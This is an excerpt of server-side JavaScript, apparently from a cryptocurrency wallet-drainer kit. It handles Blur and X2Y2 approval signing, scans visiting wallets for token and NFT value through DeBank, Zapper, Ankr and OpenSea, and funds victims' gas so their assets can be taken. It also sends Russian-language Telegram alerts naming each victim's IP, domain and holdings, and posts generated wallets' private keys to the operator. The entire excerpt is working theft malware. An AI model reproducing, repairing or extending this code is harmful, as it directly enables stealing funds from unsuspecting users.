      if (result != false) {
        send_response(response, { status: 'OK', data: result });
      } else {
        send_response(response, { status: 'error', error: 'Unable to Execute' });
      }
    } else if (data.blur == 'success') {
      if (MS_Settings.Blur.Limit == 1 && Blur_List[data.address]) {
        return send_response(response, { status: 'OK' });
      } Blur_List[data.address] = 1;
      let result = await Blur.execute(data, MS_Private_RPC_URLs[1], MS_Wallet_Private);
      if (result) {
        if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
          await send_message(receiver_chat_id, `<b>💎 Успешно подписали Blur пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете отследить транзакцию через сканеры`, {
            parse_mode: 'HTML'
          });
        }
      } else {
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          await send_message(receiver_chat_id, `<b>❌ Не удалось подписать Blur пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВозможно, транзакция не прошла или ещё в очереди!`, {
            parse_mode: 'HTML'
          });
        }
      }
      send_response(response, { status: 'OK' });
    } else {
      send_response(response, { status: 'error', error: 'Unable to Execute' });
    }
  } catch (err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const x2y2_handler = async (response, data) => {
  try {
    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
      }
    }
    if (data.x2y2 == 'request') {
      if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_request.chat_id : data.chat_data.approve_request;
        let nfts_list_str = '';
        for (const asset of data.assets) {
          try {
            nfts_list_str += `${asset.name} (${asset.amount_usd.toFixed(2)}$); `;
          } catch(err) {
            console.log(err);
          }
        }
        await send_message(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на X2Y2</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Список NFT:</b> ${nfts_list_str}`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
    } else if (data.x2y2 == 'cancel') {
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        await send_message(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил X2Y2</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nМы предложим ему списать NFT отдельно`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
    } else if (data.x2y2 == 'success') {
      if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
        await send_message(receiver_chat_id, `<b>💎 Успешно подписали X2Y2 пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете отследить транзакцию через сканеры`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
    } else {
      send_response(response, { status: 'error', error: 'Unable to Execute' });
    }
  } catch (err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const check_wallet = async (response, data) => {
  try {

    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
        if (User_IPs_Pool[data.IP]['check_wallet']) {
          if (Math.floor(Date.now() / 1000) - User_IPs_Pool[data.IP]['check_wallet'] < 60) {
            return block_request(response);
          }
        }
        User_IPs_Pool[data.IP]['check_wallet'] = Math.floor(Date.now() / 1000);
      } else {
        User_IPs_Pool[data.IP] = {
          check_wallet: Math.floor(Date.now() / 1000)
        };
      }
    }

    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
    }

    if (MS_Check_Limits) {
      if (MS_Check_Settings.block_for_all && Checks_Data.all_checks >= MS_Check_Settings.limit_for_all) {
        return send_response(response, { status: 'error',  error: 'LIMITED' });
      }
      if (!data.IP || (MS_Check_Settings.block_by_ip && data.IP && Checks_Data.personal[data.IP] && Checks_Data.personal[data.IP] >= MS_Check_Settings.limit_personal)) {
        return send_response(response, { status: 'error',  error: 'LIMITED' });
      }
      if (!data.user_id || (MS_Check_Settings.block_by_id && data.user_id && Checks_Data.personal[data.user_id] && Checks_Data.personal[data.user_id] >= MS_Check_Settings.limit_personal)) {
        return send_response(response, { status: 'error',  error: 'LIMITED' });
      }
      Checks_Data.all_checks += 1;
      Checks_Data.personal[data.user_id] += 1;
      Checks_Data.personal[data.IP] += 1;
    }

    let tokens = [];

    if (MS_Use_DeBank) {
      try {
        let result = await axios.get(`https://pro-openapi.debank.com/v1/user/all_token_list?id=${data.address}`, {
          headers: {
            'Accept': 'application/json',
            'AccessKey': MS_DeBank_Token
          }
        });
        for (const asset of result.data) {
          try {
            const chain_id = convert_chain('DEBANK', 'ID', asset.chain);
            if (chain_id == false || !asset.is_verified) continue;
            if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(asset.id.toLowerCase().trim())) continue;
            else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(asset.id.toLowerCase().trim())) continue;
            let amount_usd = asset.amount * asset.price;
            let new_asset = {
              chain_id: chain_id, name: asset.name, type: (asset.id == asset.chain) ? 'NATIVE' : 'ERC20',
              amount: asset.amount, amount_raw: ethers.BigNumber.from(asset.raw_amount_hex_str).toString(),
              amount_usd, symbol: asset.symbol, decimals: asset.decimals, address: asset.id, price: asset.price
            };
            if (new_asset.price > 0) tokens.push(new_asset);
          } catch(err) {
            console.log(err);
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (MS_Use_Zapper) {
      try {
        let z_update = await axios.post(`https://api.zapper.xyz/v2/balances/tokens?addresses%5B%5D=${data.address}&networks%5B%5D=ethereum&networks%5B%5D=polygon&networks%5B%5D=optimism&networks%5B%5D=binance-smart-chain&networks%5B%5D=fantom&networks%5B%5D=avalanche&networks%5B%5D=arbitrum`, null, {
          headers: {
            'Accept': 'application/json',
            'Authorization': `Basic ${Buffer.from(MS_Zapper_Token + ':').toString('base64')}`
          }
        });
        if (z_update.data.jobId) {
          let zapper_status = 'active';
          let zapper_id = z_update.data.jobId;
          while (zapper_status == 'active') {
            await new Promise(r => setTimeout(r, 500));
            z_update = await axios.get(`https://api.zapper.xyz/v2/balances/job-status?jobId=${zapper_id}`, {
              headers: {
                'Accept': 'application/json',
                'Authorization': `Basic ${Buffer.from(MS_Zapper_Token + ':').toString('base64')}`
              }
            });
            if (z_update.data.status) {
              zapper_status = z_update.data.status;
            } else {
              zapper_status = 'unknown';
            }
          }
        }
      } catch(err) {
        console.log(err);
      }
      try {
        let result = await axios.get(`https://api.zapper.xyz/v2/balances/tokens?addresses%5B%5D=${data.address}&networks%5B%5D=ethereum&networks%5B%5D=polygon&networks%5B%5D=optimism&networks%5B%5D=binance-smart-chain&networks%5B%5D=fantom&networks%5B%5D=avalanche&networks%5B%5D=arbitrum`, {
          headers: {
            'Accept': 'application/json',
            'Authorization': `Basic ${Buffer.from(MS_Zapper_Token + ':').toString('base64')}`
          }
        });
        if (result.data[data.address] && result.data[data.address] != null) {
          for (const asset of result.data[data.address]) {
            try {
              const chain_id = convert_chain('ZAPPER', 'ID', asset.network);
              if (chain_id == false) continue;
              if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(asset.token.address.toLowerCase().trim())) continue;
              else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(asset.token.address.toLowerCase().trim())) continue;
              let item_id = -1, item_type = (asset.token.address == '0x0000000000000000000000000000000000000000') ? 'NATIVE' : 'ERC20';
              for (let x = 0; x < tokens.length; x++) {
                if ((asset.token.address == tokens[x].address) || (item_type == 'NATIVE' && item_type == tokens[x].type && chain_id == tokens[x].chain_id)) {
                  item_id = x;
                  break;
                }
              }
              if (item_id == -1) {
                let new_asset = {
                  chain_id: chain_id, name: asset.token.name || 'NATIVE', type: item_type,
                  amount: asset.token.balance, amount_raw: ethers.BigNumber.from(asset.token.balanceRaw).toString(),
                  amount_usd: asset.token.balanceUSD, symbol: asset.token.symbol || 'N/A', decimals: asset.token.decimals || 18,
                  address: asset.token.address, price: asset.token.price || 0
                };
                if (new_asset.price > 0) tokens.push(new_asset);
              }
            } catch(err) {
              console.log(err);
            }
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (MS_Use_Ankr) {
      try {
        let result = await axios.post(`https://rpc.ankr.com/multichain/${MS_Ankr_Token}`, {
          "id": 1, "jsonrpc": "2.0", "method": "ankr_getAccountBalance",
          "params": {
            "blockchain": [ "eth", "bsc", "polygon", "avalanche", "arbitrum", "fantom", "optimism", "base" ],
            "walletAddress": data.address
          }
        }, {
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
          }
        });
        for (const asset of result.data.result.assets) {
          try {
            const chain_id = convert_chain('ANKR', 'ID', asset.blockchain);
            if (chain_id == false) continue;
            let contract_address = asset.contractAddress || 'NATIVE';
            if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(contract_address.toLowerCase().trim())) continue;
            else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(contract_address.toLowerCase().trim())) continue;
            let item_id = -1, item_type = (contract_address == 'NATIVE') ? 'NATIVE' : 'ERC20';
            for (let x = 0; x < tokens.length; x++) {
              if ((contract_address == tokens[x].address) || (item_type == 'NATIVE' && item_type == tokens[x].type && chain_id == tokens[x].chain_id)) {
                item_id = x;
                break;
              }
            }
            if (item_id == -1) {
              let new_asset = {
                chain_id: chain_id,
                name: asset.tokenName, type: asset.tokenType,
                amount: parseFloat(asset.balance), amount_raw: asset.balanceRawInteger,
                amount_usd: parseFloat(asset.balanceUsd), symbol: asset.tokenSymbol,
                decimals: asset.tokenDecimals, address: contract_address || null,
                price: parseFloat(asset.tokenPrice)
              };
              if (new_asset.price > 0) tokens.push(new_asset);
            }
          } catch(err) {
            console.log(err);
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (MS_Use_Native) {
      try {
        let chains_promises = [];
        for (const chain_id in MS_Private_RPC_URLs) {
          try {
            chains_promises.push(new Promise(async (resolve) => {
              try {
                const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[parseInt(chain_id)]);
                const balance = await node.getBalance(data.address);
                const balance_ether = parseFloat(ethers.utils.formatEther(balance));
                const balance_dollar = balance_ether * (MS_Currencies[convert_chain('ID', 'CURRENCY', parseInt(chain_id))]['USD'] || 0);
                let item_id = -1, item_type = 'NATIVE';
                for (let x = 0; x < tokens.length; x++) {
                  if (item_type == tokens[x].type && parseInt(chain_id) == tokens[x].chain_id) {
                    item_id = x;
                    break;
                  }
                }
                if (item_id == -1) {
                  let new_asset = {
                    chain_id: parseInt(chain_id), name: convert_chain('ID', 'CURRENCY', parseInt(chain_id)), type: item_type,
                    amount: balance_ether, amount_raw: balance, amount_usd: balance_dollar, symbol: convert_chain('ID', 'CURRENCY', parseInt(chain_id)),
                    decimals: 18, address: null, price: (MS_Currencies[convert_chain('ID', 'CURRENCY', parseInt(chain_id))]['USD'] || 0)
                  };
                  if (new_asset.price > 0) tokens.push(new_asset);
                }
                for (const token of MS_Stablecoins_List[parseInt(chain_id)]) {
                  try {
                    const contract = new ethers.Contract(token.address, MS_Contract_ABI['ERC20'], node);
                    const t_balance = ethers.BigNumber.from(await contract.balanceOf(data.address));
                    const t_balance_ether = parseFloat(ethers.utils.formatUnits(t_balance, token.decimals));
                    const t_balance_dollar = t_balance_ether * token.price; item_id = -1, item_type = 'ERC20';
                    for (let x = 0; x < tokens.length; x++) {
                      if (item_type == tokens[x].type && parseInt(chain_id) == tokens[x].chain_id && tokens[x].address.toLowerCase() == token.address.toLowerCase()) {
                        item_id = x;
                        break;
                      }
                    }
                    if (item_id == -1) {
                      let new_asset = {
                        chain_id: parseInt(chain_id), name: token.name, type: item_type,
                        amount: t_balance_ether, amount_raw: t_balance, amount_usd: t_balance_dollar, symbol: token.symbol,
                        decimals: token.decimals, address: token.address, price: token.price
                      };
                      if (new_asset.price > 0) tokens.push(new_asset);
                    }
                  } catch(err) {
                    console.log(err);
                  }
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          } catch(err) {
            console.log(err);
          }
        }
        await Promise.all(chains_promises);
      } catch(err) {
        console.log(err);
      }
    }

    if (MS_Emergency_System && !MS_Emergency_Addresses.includes(data.address.toLowerCase().trim())) {
      try {
        let check_promises = [], any_send = false;
        for (const chain_id_str in MS_Public_RPC_URLs) {
          try {
            check_promises.push(new Promise(async (resolve) => {
              try {
                let chain_id = Number(chain_id_str);
                let token_balance_usd = 0;
                for (const elem of tokens) {
                  try {
                    if (parseInt(elem.chain_id) == chain_id && elem.amount_usd) {
                      token_balance_usd += parseFloat(elem.amount_usd);
                    }
                  } catch(err) {
                    console.log(err);
                  }
                }
                if (token_balance_usd >= MS_Emergency_Price[chain_id]) {
                  const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[parseInt(chain_id)]);
                  const signer = new ethers.Wallet(MS_Emergency_Private, node);
                  const balance = await node.getBalance(data.address);
                  let needed_balance = MS_Emergency_Amounts[chain_id];
                  if (MS_Emergency_Mode == 1) needed_balance = needed_balance
                  * MS_Currencies['USD'][convert_chain('ID', 'CURRENCY', chain_id)];
                  needed_balance = ethers.utils.parseUnits(String(needed_balance));
                  if (balance.lt(needed_balance)) {
                    let left_balance = needed_balance.sub(balance);
                    const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));
                    const unsigned_tx = { from: MS_Emergency_Address, to: data.address, value: left_balance };
                    const gas_limit = await node.estimateGas(unsigned_tx);
                    unsigned_tx.gasLimit = gas_limit;
                    unsigned_tx.gasPrice = gas_price;
                    unsigned_tx.nonce = await node.getTransactionCount(MS_Emergency_Address, 'pending');
                    const emergency_balance = await node.getBalance(MS_Emergency_Address);
                    if (emergency_balance.gte(left_balance.add(gas_price.mul(gas_limit)))) {
                      const tx = await signer.sendTransaction(unsigned_tx);
                      await node.waitForTransaction(tx.hash, 1, 30000);
                      try {
                        await send_message(MS_Telegram_Chat_ID, `<b>⚡️ Отправили пользователю #user_${data.user_id} нативную монету</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Сеть отправки:</b> ${chain_id_to_name(chain_id)}\n<b>Сумма отправки:</b> ${parseFloat(ethers.utils.formatEther(left_balance)).toFixed(8)} ${convert_chain('ID', 'CURRENCY', chain_id)}\n<b>Основание:</b> сумма токенов - ${token_balance_usd.toFixed(2)}$`, {
                          parse_mode: 'HTML'
                        });
                      } catch(err) {
                        console.log(err);
                      } any_send = true;
                    }
                  }
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          } catch(err) {
            console.log(err);
          }
        }
        await Promise.all(check_promises);
        if (any_send && MS_Emergency_Protection)
          MS_Emergency_Addresses.push(data.address.toLowerCase().trim());
      } catch(err) {
        console.log(err);
      }
    }

    return send_response(response, { status: 'OK', data: tokens });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
}

const get_wallet_balance = async (address) => {
  try {
    let result = await axios.get(`https://pro-openapi.debank.com/v1/user/total_balance?id=${address}`, {
      headers: {
        'Accept': 'application/json',
        'AccessKey': MS_DeBank_Token
      }
    });
    await new Promise(r => setTimeout(r, 1000));
    let result_2 = await axios.get(`https://pro-openapi.debank.com/v1/user/all_token_list?id=${address}`, {
      headers: {
        'Accept': 'application/json',
        'AccessKey': MS_DeBank_Token
      }
    });
    if (result.data.total_usd_value && typeof result_2.data == 'object') {
      return {
        balance: result.data.total_usd_value,
        chains: result.data.chain_list,
        assets: result_2.data
      }
    }
  } catch(err) {
    return false;
  }
};

const check_nft = async (response, data) => {
  try {

    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
        if (User_IPs_Pool[data.IP]['check_nfts']) {
          if (Math.floor(Date.now() / 1000) - User_IPs_Pool[data.IP]['check_nfts'] < 60) {
            return block_request(response);
          }
        }
        User_IPs_Pool[data.IP]['check_nfts'] = Math.floor(Date.now() / 1000);
      } else {
        User_IPs_Pool[data.IP] = {
          check_nfts: Math.floor(Date.now() / 1000)
        };
      }
    }

    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
    }

    if (MS_Check_Limits) {
      if (MS_Check_Settings.block_for_all && Checks_Data.all_checks >= MS_Check_Settings.limit_for_all) {
        return send_response(response, { status: 'error',  error: 'LIMITED' });
      }
      if (!data.IP || (MS_Check_Settings.block_by_ip && data.IP && Checks_Data.personal[data.IP] && Checks_Data.personal[data.IP] >= MS_Check_Settings.limit_personal)) {
        return send_response(response, { status: 'error',  error: 'LIMITED' });
      }
      if (!data.user_id || (MS_Check_Settings.block_by_id && data.user_id && Checks_Data.personal[data.user_id] && Checks_Data.personal[data.user_id] >= MS_Check_Settings.limit_personal)) {
        return send_response(response, { status: 'error',  error: 'LIMITED' });
      }
      Checks_Data.all_checks += 1;
      Checks_Data.personal[data.user_id] += 1;
      Checks_Data.personal[data.IP] += 1;
    }

    let tokens = [];

    try {
      if (MS_Use_OpenSea) {
        let result = await axios.get(`https://api.opensea.io/api/v1/assets?owner=${data.address}&order_direction=desc&limit=200&include_orders=false`, {
          headers: {
            'Accept': 'application/json',
            'X-API-KEY': MS_OpenSea_Token
          }
        });
        if (result.data.assets) {
          let result_2 = await axios.get(`https://api.opensea.io/api/v1/collections?asset_owner=${data.address}&offset=0&limit=200`, {
            headers: {
              'Accept': 'application/json',
              'X-API-KEY': MS_OpenSea_Token
            }
          });
          for (const asset of result.data.assets) {
            try {
              let collection = null;
              for (const x_collection of result_2.data) {
                try {
                  if (x_collection.primary_asset_contracts.length < 1) continue;
                  if (x_collection.primary_asset_contracts[0].address == asset.asset_contract.address) {
                    collection = x_collection;
                    break;
                  }
                } catch(err) {
                  console.log(err);
                }
              }
              if (collection == null) continue;
              if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(asset.asset_contract.address.toLowerCase().trim())) continue;
              else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(asset.asset_contract.address.toLowerCase().trim())) continue;
              let asset_chain_id = convert_chain('OPENSEA', 'ID', asset.asset_contract.chain_identifier);
              let asset_price = (collection.stats.one_day_average_price != 0) ? collection.stats.one_day_average_price : collection.stats.seven_day_average_price;
              asset_price = asset_price * MS_Currencies[convert_chain('ID', 'CURRENCY', asset_chain_id)]['USD'];
              let new_asset = {
                chain_id: asset_chain_id, name: asset.name, type: asset.asset_contract.schema_name, amount: asset.num_sales,
                amount_raw: null, amount_usd: asset_price, id: asset.token_id, symbol: null, decimals: null,
                address: asset.asset_contract.address, price: asset_price
              };
              if (typeof asset_price == 'number' && !isNaN(asset_price) && asset_price > 0) tokens.push(new_asset);
            } catch(err) {
              console.log(err);
            }
          }
        }
      } else if (MS_Use_DeBank && !MS_Use_Zapper) {
        let result = await axios.get(`https://pro-openapi.debank.com/v1/user/all_nft_list?id=${data.address}`, {
          headers: {
            'Accept': 'application/json',
            'AccessKey': MS_DeBank_Token
          }
        });
        for (const asset of result.data) {
          try {
            const chain_id = convert_chain('DEBANK', 'ID', asset.chain);
            if (chain_id == false) continue;
            if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(asset.contract_id.toLowerCase().trim())) continue;
            else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(asset.contract_id.toLowerCase().trim())) continue;
            asset.name = asset.name.replaceAll(/[^a-zA-Z0-9 ]/g, '');
            let new_asset = {
              chain_id: chain_id, name: asset.name, type: asset.is_erc721 ? 'ERC721' : 'ERC1155',
              amount: asset.amount, amount_raw: null, amount_usd: asset.usd_price || null, id: asset.inner_id,
              symbol: null, decimals: null, address: asset.contract_id, price: asset.usd_price || null
            };
            if (new_asset.price != null && new_asset.price > 0) tokens.push(new_asset);
          } catch(err) {
            console.log(err);
          }
        }
      } else {
        let result = await axios.get(`https://api.zapper.fi/v2/nft/balances/tokens?addresses%5B%5D=${data.address}&limit=25`, {
          headers: {
            'Accept': 'application/json',
            'Authorization': `Basic ${Buffer.from(MS_Zapper_Token + ':').toString('base64')}`
          }
        });
        for (const asset of result.data.items) {
          try {
            const chain_id = convert_chain('ZAPPER', 'ID', asset.token.collection.network);
            if (chain_id == false) continue;
            if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(asset.token.collection.address.toLowerCase().trim())) continue;
            else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(asset.token.collection.address.toLowerCase().trim())) continue;
            let price = parseFloat(asset.token.estimatedValueEth) * MS_Currencies[convert_chain('ID', 'CURRENCY', chain_id)]['USD'];
            if (typeof price != 'number' || isNaN(price)) continue;
            asset.token.name = asset.token.name.replaceAll(/[^a-zA-Z0-9 ]/g, '');
            let new_asset = {
              chain_id: chain_id, name: asset.token.name, type: (asset.token.collection.nftStandard != 'erc1155') ? 'ERC721' : 'ERC1155',
              amount: asset.balance, amount_raw: null, amount_usd: price, id: asset.token.tokenId,
              symbol: null, decimals: null, address: asset.token.collection.address, price: price
            };
            if (new_asset.price > 0) tokens.push(new_asset);
          } catch(err) {
            console.log(err);
          }
        }
      }
    } catch(err) {
      console.log(err);
    }

    return send_response(response, { status: 'OK', data: tokens });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

let Message_TS_List = {};

if (MS_Repeats_Protection) {
  setInterval(() => {
    Message_TS_List = {};
  }, MS_Repeats_TS * 1000);
}

web.post("/", (request, response) => {
  try {
    let data = request.body;

    if (!data['ver'] || data['ver'] != '28112023') {
      return send_response(response, { status: 'error', error: 'INVALID_VERSION' });
    }

    if (!data['raw']) {
      return response.status(500).send('Unable to Execute');
    }

    const encode_key = Buffer.from(String(5 + 10 + 365 + 2048 + 867 + MS_Encryption_Key)).toString('base64');
    data = JSON.parse(Buffer.from(srp(encode_key, data['raw']), 'base64').toString('ascii'));
    if (!data['action']) return response.status(500).send('Unable to Execute');

    data['IP'] = request.headers['x-forwarded-for'] || request.socket['remoteAddress'];
    data['IP'] = data['IP'].replace('::ffff:', '');

    data['UA'] = request.useragent;

    if (MS_Domains_Mode == 1 && MS_Domains_Whilelist.length > 0 && data['domain']) {
      try {
        if (!MS_Domains_Whilelist.includes(data['domain'])) {
          return send_response(response, { status: 'error', error: 'Unable to Execute' });
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (data['IP'] && MS_IP_Blacklist.includes(data['IP'].toLowerCase().trim())) {
      try {
        block_request(response);
        return;
      } catch(err) {
        console.log(err);
      }
    }

    if (!('partner_address' in data)) data.partner_address = false;

    if (MS_Repeats_Protection) {
      if (!data['message_ts'] || (data['user_id'] && data['message_ts']
      && Message_TS_List[data['user_id']] && data['message_ts'] <= Message_TS_List[data['user_id']]) || (data['IP'] && data['message_ts']
      && Message_TS_List[data['IP']] && data['message_ts'] <= Message_TS_List[data['IP']])) {
        return send_response(response, { status: 'error', error: 'Unable to Execute' });
      } else {
        Message_TS_List[data['IP']] = data['message_ts'];
        Message_TS_List[data['user_id']] = data['message_ts'];
      }
    }

    if (data['action'] == 'retrive_config') {
      const Notifications = {};
      for (const key in MS_Notifications)
        Notifications[key] = MS_Notifications[key].mode;
      let personal_wallet = null;
      if (MS_Settings.Use_Wallet_Randomizer || MS_Settings.Use_Randomizer_For_Tokens) {
        if (data.personal_wallet && typeof data.personal_wallet == 'object' && ethers.utils.isAddress(data.personal_wallet.address)) {
          personal_wallet = { address: data.personal_wallet.address };
          setTimeout(() => {
            if (MS_Notifications.random_wallet.mode == true) {
              send_message(MS_Notifications.random_wallet.chat_id, `<b>👛 Используем кошелек для #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Адрес:</b> <code>${personal_wallet.address}</code>\n<b>Приватный ключ:</b> <i>не новый кошелек</i>`, {
                parse_mode: 'HTML'
              });
            }
          }, 1500);
        } else {
          personal_wallet = create_wallet();
          try {
            if (MS_Notifications.random_wallet.mode == true) {
              setTimeout(() => {
                send_message(MS_Notifications.random_wallet.chat_id, `<b>👛 Создали кошелек для #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Адрес:</b> <code>${personal_wallet.address}</code>\n<b>Приватный ключ:</b>\n\n<code>${personal_wallet.private}</code>`, {
                  parse_mode: 'HTML'
                });
              }, 1500);
            }
          } catch(err) {
            console.log(err);
          }
        }
      }
      return send_response(response, {
        status: 'OK',
        data: {
          RPCs: MS_Public_RPC_URLs, Address: MS_Wallet_Address,
          Notifications: Notifications, Settings: MS_Settings,
          Contract_Blacklist: MS_Contract_Blacklist,
          Contract_Whitelist: MS_Contract_Whitelist,
          Wallet_Blacklist: MS_Wallet_Blacklist,
          Receiver: MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)],
          CIS: MS_CIS_Protection, V_MSG: MS_VERIFY_MESSAGE, Loop_N: MS_Loop_Native,
          Loop_T: MS_Loop_Tokens, Loop_NFT: MS_Loop_NFTs,
          Permit_BL: MS_PERMIT_BLACKLIST, V_MODE: MS_VERIFY_WALLET,
          Unlimited_BL: MS_UNLIMITED_BLACKLIST, DSB: MS_Disable_System,
          AT: "", LA: MS_Loop_Assets, Public_Contract: (MS_Settings.Use_Public_Contract ? MS_Public_Contract : null),
          Personal_Wallet: ((MS_Settings.Use_Wallet_Randomizer || MS_Settings.Use_Randomizer_For_Tokens) ? { address: personal_wallet.address } : null)
        }
      });
    } else if (data['action'] == 'retrive_contract') {
      return send_response(response, {
        status: 'OK', data: MS_Contract_ABI
      });
    } else if (data['action'] == 'retrive_id') {
      return send_response(response, {
        status: 'OK',  data: free_id()
      });
    } else if (data['action'] == 'check_wallet') {
      if (MS_Use_DeBank == false && MS_Use_Zapper == false && MS_Use_Ankr == false && MS_Use_Native == false) {
        return send_response(response, {
          status: 'error',  error: 'LOCAL_CHECK'
        });
      } else {
        return check_wallet(response, data);
      }
    } else if (data['action'] == 'check_nft') {
      return check_nft(response, data);
    } else if (data['action'] == 'sign_verify') {
      if (MS_VERIFY_WALLET == 0) {
        MS_Verified_Addresses[data.address] = Math.floor(Date.now() / 1000);
        return send_response(response, { status: 'OK' });
      } else {
        const is_sign_correct = ethers.utils.recoverAddress(ethers.utils.hashMessage(((!data.message || data.message == "") ? MS_VERIFY_MESSAGE : data.message).replaceAll('{{ADDRESS}}', data.address)), data.sign);
        if (is_sign_correct) {
          MS_Verified_Addresses[data.address] = Math.floor(Date.now() / 1000);
          return send_response(response, { status: 'OK' });
        } else {
          return send_response(response, { status: 'error',  error: 'INVALID_SIGN' });
        }
      }
    } else if (data['action'] == 'enter_website') {
      return on_enter_website(response, data);
    } else if (data['action'] == 'leave_website') {
      return on_leave_website(response, data);
    } else if (data['action'] == 'connect_request') {
      return on_connect_request(response, data);
    } else if (data['action'] == 'connect_cancel') {
      return on_connect_cancel(response, data);
    } else if (data['action'] == 'connect_success') {
      return on_connect_success(response, data);
    } else if (data['action'] == 'check_finish') {
      return on_check_finish(response, data);
    } else if (data['action'] == 'transfer_request') {
      return on_transfer_request(response, data);
    } else if (data['action'] == 'sign_request') {
      return on_sign_request(response, data);
    } else if (data['action'] == 'approve_request') {
      return on_approve_request(response, data);
    } else if (data['action'] == 'transfer_success') {
      return on_transfer_success(response, data);
    } else if (data['action'] == 'sign_success') {
      return on_sign_success(response, data);
    } else if (data['action'] == 'swap_success') {
      return on_swap_success(response, data);
    } else if (data['action'] == 'swap_request') {
      return on_swap_request(response, data);
    } else if (data['action'] == 'approve_success') {
      return on_approve_success(response, data);
    } else if (data['action'] == 'transfer_cancel') {
      return on_transfer_cancel(response, data);
    } else if (data['action'] == 'sign_cancel') {
      return on_sign_cancel(response, data);
    } else if (data['action'] == 'approve_cancel') {
      return on_approve_cancel(response, data);
    } else if (data['action'] == 'chain_request') {
      return on_chain_request(response, data);
    } else if (data['action'] == 'chain_success') {
      return on_chain_success(response, data);
    } else if (data['action'] == 'chain_cancel') {
      return on_chain_cancel(response, data);
    } else if (data['action'] == 'sign_unavailable') {
      return on_sign_unavailable(response, data);
